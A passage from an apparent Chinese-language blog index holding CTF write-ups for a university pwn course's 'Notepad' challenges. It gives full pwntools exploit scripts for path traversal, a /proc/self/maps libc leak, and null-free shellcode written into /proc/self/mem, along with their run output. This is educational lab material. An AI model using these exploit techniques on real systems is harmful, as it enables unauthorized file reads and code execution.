oflag); if(filefd \u0026lt; 0){ puts(\u0026#34;Couldn\u0026#39;t open the file.\u0026#34;); return -1; } lseek(filefd, offset, SEEK_SET); return filefd; } void command_editnote(int fd, char *notename, off_t offset, char *content) { int filefd = openfile(fd, notename, offset, O_RDWR); write(filefd, content, strlen(content)); close(filefd); puts(\u0026#34;Note modified.\u0026#34;); } void command_shownote(int fd, char *notename, off_t offset) { int filefd = openfile(fd, notename, offset, O_RDONLY); char buf[128]; ssize_t readlen = read(filefd, buf, sizeof(buf)); if(readlen\u0026lt;=0){ puts(\u0026#34;Read note failed.\u0026#34;); return ; } write(1, buf, readlen); } void menu() { puts(\u0026#34;+========== Notepad ==========+\u0026#34;); puts(\u0026#34;| 1. Login |\u0026#34;); puts(\u0026#34;| 2. Register |\u0026#34;); puts(\u0026#34;| 3. New Note |\u0026#34;); puts(\u0026#34;| 4. Edit Note |\u0026#34;); puts(\u0026#34;| 5. Show Note |\u0026#34;); puts(\u0026#34;+========================================+\u0026#34;); printf(\u0026#34;\u0026gt; \u0026#34;); } long readint() { char buf[32]; for(int i=0;i\u0026lt;31;i++){ if(read(0, \u0026amp;buf[i], 1)!=1) break; if(buf[i]==\u0026#39;\\n\u0026#39;){ buf[i] = 0; break; } } return atol(buf); } size_t readlen(char *buf, size_t len) { size_t i=0; for(;i\u0026lt;len;i++){ if(read(0, \u0026amp;buf[i], 1)!=1) break; if(buf[i]==\u0026#39;\\n\u0026#39;) buf[i] = 0; } return i; } int main() { setvbuf(stdin, 0, _IONBF, 0); setvbuf(stdout, 0, _IONBF, 0); apply_seccomp(); char username[0x20]; char password[0x20]; char notename[256]; char *content; size_t clen; off_t offset; while(1){ menu(); int choice = readint(); int backendfd = connect_backend(); if(backendfd\u0026lt;=0)errorexit(\u0026#34;Couldn\u0026#39;t connect to backend.\u0026#34;); switch(choice){ case 1: printf(\u0026#34;Username: \u0026#34;); read(0, username, 0x10); printf(\u0026#34;Password: \u0026#34;); read(0, password, 0x10); command_login(backendfd, username, password); break; case 2: printf(\u0026#34;Username: \u0026#34;); read(0, username, 0x10); printf(\u0026#34;Password: \u0026#34;); read(0, password, 0x10); command_register(backendfd, username, password); break; case 3: printf(\u0026#34;Note Name: \u0026#34;); read(0, notename, 128); if(strlen(notename) \u0026amp;\u0026amp; notename[strlen(notename)-1]==\u0026#39;\\n\u0026#39;) notename[strlen(notename)-1] = 0; printf(\u0026#34;Content Length: \u0026#34;); clen = (size_t)readint(); if(clen \u0026gt; 1024){ puts(\u0026#34;Too Long\u0026#34;); break; } content = malloc(clen+1); printf(\u0026#34;Content: \u0026#34;); readlen(content, clen); command_newnote(backendfd, notename, content); break; case 4: printf(\u0026#34;Note Name: \u0026#34;); read(0, notename, 128); if(strlen(notename) \u0026amp;\u0026amp; notename[strlen(notename)-1]==\u0026#39;\\n\u0026#39;) notename[strlen(notename)-1] = 0; printf(\u0026#34;Offset: \u0026#34;); offset = (off_t)readint(); printf(\u0026#34;Content Length: \u0026#34;); clen = (size_t)readint(); if(clen \u0026gt; 1024){ puts(\u0026#34;Too Long\u0026#34;); break; } content = malloc(clen+1); printf(\u0026#34;Content: \u0026#34;); readlen(content, clen); command_editnote(backendfd, notename, offset, content); break; case 5: printf(\u0026#34;Note Name: \u0026#34;); read(0, notename, 128); if(strlen(notename) \u0026amp;\u0026amp; notename[strlen(notename)-1]==\u0026#39;\\n\u0026#39;) notename[strlen(notename)-1] = 0; printf(\u0026#34;Offset: \u0026#34;); offset = (off_t)readint(); command_shownote(backendfd, notename, offset); break; default: break; } close(backendfd); } return 0; } :::\nRecon # 這一題是等到助教給出hint才之到大概的方向，我一開始也是有一些初步的方向，不過不知道怎麼把卡住的地方解決，最後也是求助@davidchen學長才知道確切的方法。\n首先，感謝@csotaku 的提示與切入方向，既然知道是path traversal的洞，那就代表某個地方我們可以輸入一些簡單的payload，例如./，而這個地方還必須和讀檔有關係，想到這邊我們的選擇也呼之欲出，洞就在==openfile==的地方，我們輸入的notename會和res.res以及.txt concatenate在一起，，不過這邊有個問題是既然我們要順利讀檔，在說明中就有提到檔案名稱是==flag_user==，而不是flag_user.txt，這樣的話我們就應該要想辦法把.txt bypass掉\n想到這邊我先說我的看法，如果要把.txt bypass掉，一開始是參考飛飛的網站範例中有針對URL based的path traversal類似的情況在payload的最後面加上null byte，所以我想可以用同樣的方式bypass(\\x00)，但是怎樣的沒有成功，另外我還有一個疑問，res.res的部分到底是不是一個path，如果不是，就代表我們也需要把它蓋掉或是用其他方法leak出來之類的；當然如果是path的話就沒差了，但我很常陷入這種沒有必要的迴圈轉不出來，其實現在仔細想想，他一定是一個path，因為他最後也是要和{notename}.txt接在一起，如果他不是path就一定讀不到\n反正後來和@davidchen討論完才大致知道如何寫script，簡單來說，因為path的限制長度是128 bytes，所以res.res + {notename} + .txt基本上長度不會超過128 bytes，如果會的話就會被擠出去，所以我們能夠控制的部分就是notename，雖然我們不知道res.res的長度多少，但我們可以爆破，讓這三者串在一起會大於128 bytes並且沒有被寫入path的部分就是.txt，這樣的話就可以順利讀到flag的內容，具體怎麼做就是一直加上/\nExploit - Path Traversal # 因為這一題需要進行pow，才能順利開一個vm給我們，並且把port number讓我們連過去\n==PoW.py== # 這是助教寫的script\n#!/usr/bin/env python3 import hashlib import sys prefix = sys.argv[1] difficulty = int(sys.argv[2]) zeros = \u0026#39;0\u0026#39; * difficulty def is_valid(digest): if sys.version_info.major == 2: digest = [ord(i) for i in digest] bits = \u0026#39;\u0026#39;.join(bin(i)[2:].zfill(8) for i in digest) return bits[:difficulty] == zeros i = 0 while True: i += 1 s = prefix + str(i) if is_valid(hashlib.sha256(s.encode()).digest()): print(i) exit(0) ==pow.py== # 這是我寫的pow，就是簡單的subprocess的執行助教給的script，然後傳送和接收一些IO\nfrom pwn import * from subprocess import * \u0026#39;\u0026#39;\u0026#39;######### Dealing Connection and PoW #########\u0026#39;\u0026#39;\u0026#39; r = remote(\u0026#39;10.113.184.121\u0026#39;, 10044) r.recvuntil(b\u0026#39;sha256(\u0026#39;) prefix = r.recvuntil(b\u0026#39; + \u0026#39;).strip().decode().split(\u0026#39; \u0026#39;)[0] difficulty = r.recvline().strip().decode().split(\u0026#39;(\u0026#39;)[-1].split(\u0026#39;)\u0026#39;)[0] log.info(f\u0026#34;PoW\u0026#39;s prefix = {prefix}, difficulty = {difficulty}\u0026#34;) p = Popen(f\u0026#34;python ../pow_solver.py {prefix} {difficulty}\u0026#34;, stdin=PIPE, stdout=PIPE, universal_newlines=True, shell=True) pow_result = p.stdout.readline().strip() log.info(f\u0026#39;PoW Result = {pow_result}\u0026#39;) r.sendline(pow_result.encode()) r.recvuntil(b\u0026#39;Your service is running on port \u0026#39;) init_port = r.recvuntil(b\u0026#39;.\u0026#39;).decode().split(\u0026#39;.\u0026#39;)[0] log.success(f\u0026#39;Receive Port = {init_port}\u0026#39;) r.close() ==exp.py== # from pwn import * from tqdm import * cmd_dic = {1:\u0026#39;Login\u0026#39;, 2:\u0026#39;Register\u0026#39;, 3:\u0026#39;New Note\u0026#39;, 4:\u0026#39;Edit Note\u0026#39;, 5:\u0026#39;Show Note\u0026#39;} def dealing_cmd(r, cmd, note_name=b\u0026#39;test\u0026#39;, content_len=b\u0026#39;5\u0026#39;, content=b\u0026#39;test\\n\u0026#39;, offset=b\u0026#39;0\u0026#39;, random=\u0026#39;0\u0026#39;): r.recvlines(7) if cmd == 1 or cmd == 2: r.sendline(str(cmd).encode()) r.sendlineafter(b\u0026#39;Username: \u0026#39;, b\u0026#39;sbk\u0026#39; + random.encode()) r.sendlineafter(b\u0026#39;Password: \u0026#39;, b\u0026#39;sbk\u0026#39; + random.encode()) if b\u0026#39;Success\u0026#39; in r.recvline(): log.success(f\u0026#39;Command {cmd_dic[cmd]} Successful\u0026#39;) else: log.error(\u0026#39;Command Login Failed!!!\u0026#39;) if cmd == 3: r.sendline(str(cmd).encode()) r.sendlineafter(b\u0026#39;Note Name: \u0026#39;, note_name) r.sendlineafter(b\u0026#39;Content Length: \u0026#39;, content_len) r.sendlineafter(b\u0026#39;Content: \u0026#39;, content) if b\u0026#39;created\u0026#39; in r.recvline(): log.success(f\u0026#39;Command {cmd_dic[cmd]} Successful\u0026#39;) else: log.error(f\u0026#39;Command {cmd_dic[cmd]} Failed!!!\u0026#39;) if cmd == 4: r.sendline(str(cmd).encode()) r.sendlineafter(b\u0026#39;Note Name: \u0026#39;, note_name) r.sendlineafter(b\u0026#39;Offset: \u0026#39;, offset) r.sendlineafter(b\u0026#39;Content Length: \u0026#39;, content_len) r.sendlineafter(b\u0026#39;Content: \u0026#39;, content) if b\u0026#39;modified\u0026#39; in r.recvline(): log.success(f\u0026#39;Command {cmd_dic[cmd]} Successful\u0026#39;) else: log.error(f\u0026#39;Command {cmd_dic[cmd]} Failed!!!\u0026#39;) if cmd == 5: r.sendline(str(cmd).encode()) r.sendlineafter(b\u0026#39;Note Name: \u0026#39;, note_name) r.sendlineafter(b\u0026#39;Offset: \u0026#39;, offset) res = r.recvline().decode().strip() if \u0026#39;flag\u0026#39; in res: log.success(res) log.success(r.recvline().decode().strip()) return 1 \u0026#39;\u0026#39;\u0026#39;######### Dealing Exploit #########\u0026#39;\u0026#39;\u0026#39; init_port = sys.argv[1] r = remote(\u0026#39;10.113.184.121\u0026#39;, init_port) random = os.urandom(1).hex() dealing_cmd(r, 2, random=random) dealing_cmd(r, 1, random=random) payload = b\u0026#39;../../../../../../\u0026#39; while len(payload) \u0026lt; 128: payload += b\u0026#39;/\u0026#39; # print(payload) res = dealing_cmd(r, 5, payload + b\u0026#39;flag_user\u0026#39;) if res: print(f\u0026#39;Successful payload = {payload + b\u0026#34;flag_user\u0026#34;}\u0026#39;) break log.info(\u0026#34;Done\u0026#34;) r.interactive() 所以實際執行會是:\n$ python pow.py [+] Opening connection to 10.113.184.121 on port 10044: Done [*] PoW\u0026#39;s prefix = CrWNJGbeaBn7NjUe, difficulty = 22 [*] PoW Result = 4122665 [+] Receive Port = 26616 [*] Closed connection to 10.113.184.121 port 10044 $ python exp-1.py 26616 python exp-1.py 26616 [+] Opening connection to 10.113.184.121 on port 26616: Done [+] Command Register Successful [+] Command Login Successful [+] flag{Sh3l1cod3_but_y0u_c@nnot_get_she!!}+========== Notepad ==========+ [+] | 1. Login | Successful payload = b\u0026#39;../../../../../../////////////////////////////////////////////////////////////////////////////////flag_user\u0026#39; [*] Done [*] Switching to interactive mode | 2. Register | | 3. New Note | | 4. Edit Note | | 5. Show Note | +========================================+ \u0026gt; $ Flag: flag{Sh3l1cod3_but_y0u_c@nnot_get_she!!}\n"},{"id":393,"href":"/security/course/ntu-cs/pwn/simple-pwn-0x322023-hw---notepad-stage-2/","title":"Simple PWN 0x32(2023 HW - Notepad-Stage 2)","section":"Securities","content":" Simple PWN 0x32(2023 HW - Notepad-Stage 2) # Description \u0026amp; Hint # Try to get /flag_backend.\nHint1: The only intended vulnerability in the frontend (notepad) is the path traversal. Hint2: Try to write the shellcode into process memory by the path traversal vulnerability.\nSource code # 呈上題\nRecon # :::success Special Thanks @cs-otaku For the most of the Inspiration of the WP :::\nRecap 在上一題，我們已經知道了他的前端漏洞為path traversal，換言之是不是可以做到任意讀取的功能，如下: def read_any_file(file_name): payload = b\u0026#39;../../../../../../\u0026#39; + b\u0026#39;/\u0026#39; * (89 - len(file_name)) + file_name offset = 0 res = \u0026#39;\u0026#39; while(True): ret = dealing_cmd(r, 5, payload, offset=str(offset).encode()) # print(ret, len(ret)) if ret != \u0026#39;Read note failed.\u0026#39; and ret != \u0026#34;Couldn\u0026#39;t open the file.\u0026#34;: res += ret offset += 128 else: log.success(res) break return res ==漏洞發想== 透過@cs-otaku的WP，了解到如果可以做到任意讀取有甚麼厲害的地方呢?那我們就可以想辦法用該題提供的write_note的功能以及lseek的功能，寫入==/proc/self/mem==這個檔案，這是甚麼東西呢?可以看一下虛擬內存探究 \u0026ndash; 第一篇:C strings \u0026amp; /proc，要做的事情和我們的幾乎一樣，簡單說就是\n/proc/[pid]/mem This file can be used to access the pages of a process\u0026rsquo;s memory through open(2), read(2), and lseek(2). Permission to access this file is governed by a ptrace access mode PTRACE_MODE_ATTACH_FSCREDS check; see ptrace(2).\n/proc/[pid]/maps A file containing the currently mapped memory regions and their access permissions. See mmap(2) for some further information about memory mappings. Permission to access this file is governed by a ptrace access mode PTRACE_MODE_READ_FSCREDS check; see ptrace(2). The format of the file is:\naddress perms offset dev inode pathname 00400000-00452000 r-xp 00000000 08:02 173521 /usr/bin/dbus-daemon 00651000-00652000 r--p 00051000 08:02 173521 /usr/bin/dbus-daemon 00652000-00655000 rw-p 00052000 08:02 173521 /usr/bin/dbus-daemon 00e03000-00e24000 rw-p 00000000 00:00 0 [heap] 00e24000-011f7000 rw-p 00000000 00:00 0 [heap] ... 35b1800000-35b1820000 r-xp 00000000 08:02 135522 /usr/lib64/ld-2.15.so 35b1a1f000-35b1a20000 r--p 0001f000 08:02 135522 /usr/lib64/ld-2.15.so 35b1a20000-35b1a21000 rw-p 00020000 08:02 135522 /usr/lib64/ld-2.15.so 35b1a21000-35b1a22000 rw-p 00000000 00:00 0 35b1c00000-35b1dac000 r-xp 00000000 08:02 135870 /usr/lib64/libc-2.15.so 35b1dac000-35b1fac000 ---p 001ac000 08:02 135870 /usr/lib64/libc-2.15.so 35b1fac000-35b1fb0000 r--p 001ac000 08:02 135870 /usr/lib64/libc-2.15.so 35b1fb0000-35b1fb2000 rw-p 001b0000 08:02 135870 /usr/lib64/libc-2.15.so ... f2c6ff8c000-7f2c7078c000 rw-p 00000000 00:00 0 [stack:986] ... 7fffb2c0d000-7fffb2c2e000 rw-p 00000000 00:00 0 [stack] 7fffb2d48000-7fffb2d49000 r-xp 00000000 00:00 0 [vdso] 從以上訊息我們知道，/proc/[pid]/mem就是實際執行該隻process的memory，而/proc/[pid]/maps就是該隻process的memory mapping，所以關於怎麼利用可以看一下csdn的這篇文章，基本上要做的事情和我們差不多，目標都是去修改/proc/[pid]/mem中的value，不過中間有很多東西需要考慮:\n要寫甚麼shellcode 要寫去哪裡 先看要寫去哪裡 按照前面所說應該是要寫/proc/[pid]/mem，但因為前面有提到他只能被open / read / lseek給access，所以目標應該是找出lseek的offset，並且把噁爛shellcode放進去；另外一個問題是我們不知道要寫到哪裡，所以我們可以利用前面的arbitrary read去看process的mapping為何，如下\n# Read /proc/self/maps to leak Libc Base maps_layout = read_any_file(b\u0026#39;/proc/self/maps\u0026#39;).split(\u0026#39;\\n\u0026#39;) libc_base = int(maps_layout[7][:12], 16) puts_addr = libc_base + libc.symbols[\u0026#39;puts\u0026#39;] log.success(f\u0026#34;Libc Base address: {hex(libc_base)}\u0026#34;) log.success(f\u0026#39;Puts Address: {hex(puts_addr)}\u0026#39;) 這樣的話，我們就知道他位於整個memory layout，以及我們想要置換的puts symbols的位置\n要寫甚麼 前面有提到我們需要寫shellcode進去，以替換puts的行為，所以我們需要寫些甚麼server才能噴flag給我們呢?如下\n# Socket Config int fd = socket(AF_INET, SOCK_STREAM, 0); struct sockaddr_in info; info.sin_family = PF_INET; info.sin_addr.s_addr = inet_addr(\u0026#34;127.0.0.1\u0026#34;); info.sin_port = htons(8765); # Connect to Backend connect(fd, (struct sockaddr *)\u0026amp;info, sizeof(info)) # Write 0x8787 to fd struct Command cmd; cmd.cmd = 0x8787; write(fd, \u0026amp;cmd, sizeof(cmd)); # Read the result from fd struct Response res; read(fd, $rsp, sizeof(res); # Write the result from fd to stdout write(1, $rsp, 0x40); 簡單來說，前面需要我們設定socket的config，然後用這個config連線到後端，並且把command置換成0x8787，傳送到後端給的fd，這樣後段就會直接噴flag給我們(準確來說是那個fd)，所以我們要承接fd接到的flag並且送到stdout，大概是這樣，但這一連串的操作其實是助教一開始在課堂中有提示，並且看了@cs-otaku的WP也有提到該步驟才知道，所以如果都不知道以上操作的話要怎麼辦呢?我們可以想辦法把backend的binary讀出來，這樣的話就只能自行把backend的binary讀出來再去分析裡面的奧義\n我是直接用godbolt搭配x86-64 disassembly :::spoiler godbolt Result ::: 不過正如@cs-otaku說的\n寫入content是用write去寫的。所以shellcode裡面不可以出現\\x00這種東西\n所以我也是邊參考disassembly的結果慢慢看中間有沒有\\x00的byte，如果有就要想其他的payload替換掉\nSocket Config 像是這邊我不知道AF_INET所代表的byte是多少就可以直接看godbolt的結果，另外syscall要用哪一個可以參考linux x86-64 syscall，並且根據calling convention把shellcode擺好，切記看完之後要看一下轉換成shellcode看有沒有\\x00的byte，可以用pwntools的asm function或是直接用x86-64 disassembly都可以達到一樣的效果 # int fd = socket(AF_INET, SOCK_STREAM, 0); socket = \u0026#34;\u0026#34;\u0026#34; xor rax, rax mov al, 0x29 xor rdi, rdi mov dil, 0x2 xor rsi, rsi mov sil, 0x1 xor rdx, rdx syscall mov r8, rax \u0026#34;\u0026#34;\u0026#34; Connect 這邊主要需要觀察protocol怎麼包，首先我們知道第一個參數是存$rdi，也就是存上一個syscall的return value存起來的$r8，至於$rsi的info address，其內容應該怎麼包含甚麼呢?我們先看一下linux x86-64 syscall中的說明 他所需的是struct sockaddr_in info;，而實際去看看sockaddr_in會發現他的結構如下(csdn post): struct sockaddr_in { short sin_family; //address family u_short sin_port; //16 bit TCP/UDP port number struct in_addr sin_addr; //32 bit IP address char sin_zero[8]; //not use, for align }; 就會對應到底下註解的地方，包含IP / Post / Internet Family之類的，所以我們就可以按照這個structure建構出來，short是2 bytes，而根據前面的byte code會發現AF_INET是\\x0002，也就是兩個bytes，第二個是port也是兩個bytes，8765轉成hex就是0x223d；最後一個是IP address，總共是4 bytes的in_addr structure，如果想詳細了解in_addr的結構可以看MSDN，但具體來說就是把127.0.0.1→7f000001，所以全部貼在一起並且轉成little endian的話就會變成==0x100007f3d220002==，但有一個非常大的問題，如果直接把該值push進到stack並取$rsp放到$rsi的話，整個流程會有太多的\\x00，因此@cs-otaku提供了一個非常有創意的想法，就直接用扣的，反正只要最後放到stack的值是對的就好了 # struct sockaddr_in info; # info.sin_family = AF_INET; # info.sin_addr.s_addr = inet_addr(\u0026#34;127.0.0.1\u0026#34;); # info.sin_port = htons(8765); # connect(fd, (struct sockaddr *)\u0026amp;info, sizeof(info)); connect = \u0026#34;\u0026#34;\u0026#34; xor rax, rax mov al, 0x2a mov rdi, r8 mov rsi, 0xffffffffffffffff mov r9, 0xfeffff80c2ddfffd sub rsi, r9 push rsi mov rsi, rsp xor rdx, rdx mov dl, 0x10 syscall \u0026#34;\u0026#34;\u0026#34; Write 這一段主要是置換原本不應該出現的command，因為按照原本程式的流程，只會有CMD_Register→0x1 / CMD_Login→0x2 / CMD_GetFolder→0x11 / CMD_NewNote→0x12等這四種，分別會在對應的操作下傳到backend後讓他做對應的操作，現在我們要把cmd.cmd改成0x8787，之後用write把這個command寫到對應的fd中，如同其他command也那樣操作一樣 # struct Command cmd; # cmd.cmd = 0x8787; // #define CMD_Flag 0x8787 # write(fd, \u0026amp;cmd, sizeof(cmd)); write = \u0026#34;\u0026#34;\u0026#34; xor r9, r9 mov r9w, 0x8787 push r9 xor rax, rax mov al, 0x1 mov rdi, r8 mov rsi, rsp xor rdx, rdx mov dl, 0xa4 syscall \u0026#34;\u0026#34;\u0026#34; Read 這一段原本的command應該是read(fd, \u0026amp;res, sizeof(res))，我們會去接res傳回來的結果，所以後面的size應該直接看res他的結構有多大而定，總共是一個uint32_t的code + 256個char，所以是260 bytes，也就是0x104，並且我們把res的地址傳給$rsp # read(fd, $rsp, sizeof(res)); read = \u0026#34;\u0026#34;\u0026#34; xor rax, rax mov rdi, r8 mov rsi, rsp xor rdx, rdx mov dx, 0x104 syscall \u0026#34;\u0026#34;\u0026#34; Write 2 Console 現在我們已經取得backend傳回來的response，但前端還沒辦法顯示，所以我們需要寫到stdout # write(1, $rsp, 0x40); write2console = \u0026#34;\u0026#34;\u0026#34; xor rax, rax mov al, 0x1 xor rdi, rdi mov dil, 0x1 mov rsi, rsp xor rdx, rdx mov dl, 0x40 syscall \u0026#34;\u0026#34;\u0026#34; 接著我們就只要透過command 4的write note功能把構建好的shellcode，寫到/proc/self/mem對應的位置就好，也就是置換掉puts原本的操作，讓他再次call到puts的時候就會執行我們的shellcode\nExploit - Arbitrary Read → Arbitrary Write → Shellcode # :::spoiler\nfrom pwn import * from tqdm import * context.arch = \u0026#39;amd64\u0026#39; libc = ELF(\u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) cmd_dic = {1:\u0026#39;Login\u0026#39;, 2:\u0026#39;Register\u0026#39;, 3:\u0026#39;New Note\u0026#39;, 4:\u0026#39;Edit Note\u0026#39;, 5:\u0026#39;Show Note\u0026#39;} def dealing_cmd(r, cmd, note_name=b\u0026#39;test\u0026#39;, content=b\u0026#39;test\\n\u0026#39;, offset=b\u0026#39;0\u0026#39;, random=\u0026#39;0\u0026#39;): r.recvlines(7) if cmd == 1 or cmd == 2: r.sendline(str(cmd).encode()) r.sendlineafter(b\u0026#39;Username: \u0026#39;, b\u0026#39;sbk\u0026#39; + random.encode()) r.sendlineafter(b\u0026#39;Password: \u0026#39;, b\u0026#39;sbk\u0026#39; + random.encode()) if b\u0026#39;Success\u0026#39; in r.recvline(): log.success(f\u0026#39;Command {cmd_dic[cmd]} Successful\u0026#39;) else: log.error(\u0026#39;Command Login Failed!!!\u0026#39;) if cmd == 3: r.sendline(str(cmd).encode()) r.sendlineafter(b\u0026#39;Note Name: \u0026#39;, note_name) r.sendlineafter(b\u0026#39;Content Length: \u0026#39;, content_len) r.sendlineafter(b\u0026#39;Content: \u0026#39;, content) if b\u0026#39;created\u0026#39; in r.recvline(): log.success(f\u0026#39;Command {cmd_dic[cmd]} Successful\u0026#39;) else: log.error(f\u0026#39;Command {cmd_dic[cmd]} Failed!!!\u0026#39;) if cmd == 4: r.sendline(str(cmd).encode()) r.sendlineafter(b\u0026#39;Note Name: \u0026#39;, note_name) r.sendlineafter(b\u0026#39;Offset: \u0026#39;, str(offset).encode()) r.sendlineafter(b\u0026#39;Content Length: \u0026#39;, str(len(content)).encode()) r.sendlineafter(b\u0026#39;Content: \u0026#39;, content) log.success(\u0026#39;Done\u0026#39;) if cmd == 5: r.sendline(str(cmd).encode()) r.sendlineafter(b\u0026#39;Note Name: \u0026#39;, note_name) r.sendlineafter(b\u0026#39;Offset: \u0026#39;, offset) res = r.recv(128).decode().strip() return res def read_any_file(file_name): payload = b\u0026#39;../../../../../../\u0026#39; + b\u0026#39;/\u0026#39; * (89 - len(file_name)) + file_name offset = 0 res = \u0026#39;\u0026#39; while(True): ret = dealing_cmd(r, 5, payload, offset=str(offset).encode()) # print(ret, len(ret)) if ret != \u0026#39;Read note failed.\u0026#39; and ret != \u0026#34;Couldn\u0026#39;t open the file.\u0026#34;: res += ret offset += 128 else: log.success(res) break return res def ugly_shellcode(): # int fd = socket(AF_INET, SOCK_STREAM, 0); socket = \u0026#34;\u0026#34;\u0026#34; xor rax, rax mov al, 0x29 xor rdi, rdi mov dil, 0x2 xor rsi, rsi mov sil, 0x1 xor rdx, rdx syscall mov r8, rax \u0026#34;\u0026#34;\u0026#34; # info.sin_family = AF_INET; # info.sin_addr.s_addr = inet_addr(\u0026#34;127.0.0.1\u0026#34;); # info.sin_port = htons(8765); # connect(fd, (struct sockaddr *)\u0026amp;info, sizeof(info)); connect = \u0026#34;\u0026#34;\u0026#34; xor rax, rax mov al, 0x2a mov rdi, r8 mov rsi, 0xffffffffffffffff mov r9, 0xfeffff80c2ddfffd sub rsi, r9 push rsi mov rsi, rsp xor rdx, rdx mov dl, 0x10 syscall \u0026#34;\u0026#34;\u0026#34; # struct Command cmd; # cmd.cmd = 0x8787; // #define CMD_Flag 0x8787 # write(fd, \u0026amp;cmd, sizeof(cmd)); write = \u0026#34;\u0026#34;\u0026#34; xor r9, r9 mov r9w, 0x8787 push r9 xor rax, rax mov al, 0x1 mov rdi, r8 mov rsi, rsp xor rdx, rdx mov dl, 0xa4 syscall \u0026#34;\u0026#34;\u0026#34; # read(fd, $rsp, sizeof(res)); read = \u0026#34;\u0026#34;\u0026#34; xor rax, rax mov rdi, r8 mov rsi, rsp xor rdx, rdx mov dx, 0x104 syscall \u0026#34;\u0026#34;\u0026#34; # write(1, $rsp, 0x40); write2console = \u0026#34;\u0026#34;\u0026#34; xor rax, rax mov al, 0x1 xor rdi, rdi mov dil, 0x1 mov rsi, rsp xor rdx, rdx mov dl, 0x40 syscall \u0026#34;\u0026#34;\u0026#34; return socket + connect + write + read + write2console # Register \u0026amp; Login init_port = sys.argv[1] r = remote(\u0026#39;10.113.184.121\u0026#39;, init_port) random = os.urandom(1).hex() dealing_cmd(r, 2, random=random) dealing_cmd(r, 1, random=random) # Read /proc/self/maps to leak Libc Base maps_layout = read_any_file(b\u0026#39;/proc/self/maps\u0026#39;).split(\u0026#39;\\n\u0026#39;) libc_base = int(maps_layout[7][:12], 16) puts_addr = libc_base + libc.symbols[\u0026#39;puts\u0026#39;] log.success(f\u0026#34;Libc Base address: {hex(libc_base)}\u0026#34;) log.success(f\u0026#39;Puts Address: {hex(puts_addr)}\u0026#39;) # Get Shellcode shellcode = asm(ugly_shellcode()) log.info(f\u0026#39;Shellcode = {shellcode}\u0026#39;) # write 2 /proc/self/mem file_name = b\u0026#39;/proc/self/mem\u0026#39; path = b\u0026#39;../../../../../../\u0026#39; + b\u0026#39;/\u0026#39; * (89 - len(file_name)) + file_name dealing_cmd(r, 4, note_name=path, content=shellcode, offset=puts_addr) r.interactive() :::\n$ python exp-2.py 28961 [*] \u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Opening connection to 10.113.184.121 on port 28961: Done [+] Command Register Successful [+] Command Login Successful [+] 55cd58958000-55cd58959000 r--p 00000000 08:01 22676106 /home/notepad/notepad 55cd58959000-55cd5895b000 r-xp 00001000 08:01 22676106 /home/notepad/notepad 55cd5895b000-55cd5895c000 r--p 00003000 08:01 22676106/home/notepad/notepad 55cd5895c000-55cd5895d000 r--p 00003000 08:01 22676106 /home/notepad/notepad 55cd5895d000-55cd5895e000 rw-p 00004000 08:01 22676106 /home/notepad/notepad 55cd595e1000-55cd59602000 rw-p 00000000 00:00 0 [heap] 7f8b72c44000-7f8b72c47000 rw-p 00000000 00:00 0 7f8b72c47000-7f8b72c6f000 r--p 00000000 08:01 22554614 /usr/lib/x86_64-linux-gnu/libc.so.6 7f8b72c6f000-7f8b72e04000 r-xp 00028000 08:01 22554614/usr/lib/x86_64-linux-gnu/libc.so.6 7f8b72e04000-7f8b72e5c000 r--p 001bd000 08:01 22554614 /usr/lib/x86_64-linux-gnu/libc.so.6 7f8b72e5c000-7f8b72e60000 r--p 00214000 08:01 22554614 /usr/lib/x86_64-linux-gnu/libc.so.6 7f8b72e60000-7f8b72e62000 rw-p 00218000 08:01 22554614 /usr/lib/x86_64-linux-gnu/libc.so.6 7f8b72e62000-7f8b72e6f000 rw-p 00000000 00:00 0 7f8b72e71000-7f8b72e73000 rw-p 00000000 00:00 0 7f8b72e73000-7f8b72e75000 r--p 00000000 08:01 22554596 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 7f8b72e75000-7f8b72e9f000 r-xp 00002000 08:01 22554596 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 7f8b72e9f000-7f8b72eaa000 r--p 0002c000 08:01 22554596 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 7f8b72eab000-7f8b72ead000 r--p 00037000 08:01 22554596/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 7f8b72ead000-7f8b72eaf000 rw-p 00039000 08:01 22554596/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 7ffc5d268000-7ffc5d289000 rw-p 00000000 00:00 0[stack] 7ffc5d35b000-7ffc5d35f000 r--p 00000000 00:00 0 [vvar] 7ffc5d35f000-7ffc5d361000 r-xp 0000000000:00 0 [vdso] [+] Libc Base address: 0x7f8b72c47000 [+] Puts Address: 0x7f8b72cc7e50 [*] Shellcode = b\u0026#39;H1\\xc0\\xb0)H1\\xff@\\xb7\\x02H1\\xf6@\\xb6\\x01H1\\xd2\\x0f\\x05I\\x89\\xc0H1\\xc0\\xb0*L\\x89\\xc7H\\xc7\\xc6\\xff\\xff\\xff\\xffI\\xb9\\xfd\\xff\\xdd\\xc2\\x80\\xff\\xff\\xfeL)\\xceVH\\x89\\xe6H1\\xd2\\xb2\\x10\\x0f\\x05M1\\xc9fA\\xb9\\x87\\x87AQH1\\xc0\\xb0\\x01L\\x89\\xc7H\\x89\\xe6H1\\xd2\\xb2\\xa4\\x0f\\x05H1\\xc0L\\x89\\xc7H\\x89\\xe6H1\\xd2f\\xba\\x04\\x01\\x0f\\x05H1\\xc0\\xb0\\x01H1\\xff@\\xb7\\x01H\\x89\\xe6H1\\xd2\\xb2@\\x0f\\x05\u0026#39; [+] Done [*] Switching to interactive mode \\x00\\x00\\x00\\x00flag{why_d0_y0u_KnoM_tH1s_c0WW@nd!?}\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00[*] Got EOF while reading in interactive $ Flag: flag{why_d0_y0u_KnoM_tH1s_c0WW@nd!?}\n"},{"id":394,"href":"/security/course/ntu-cs/pwn/simple-pwn-0x332023-lab---rop_rw/","title":"Simple PWN 0x33(2023 Lab - ROP_RW)","section":"Securities","content":" Simple PWN 0x33(2023 Lab - ROP_RW) # Background # ROP chain\nSource code # :::spoiler Source Code\n#include \u0026lt;stdio.h\u0026gt; #include 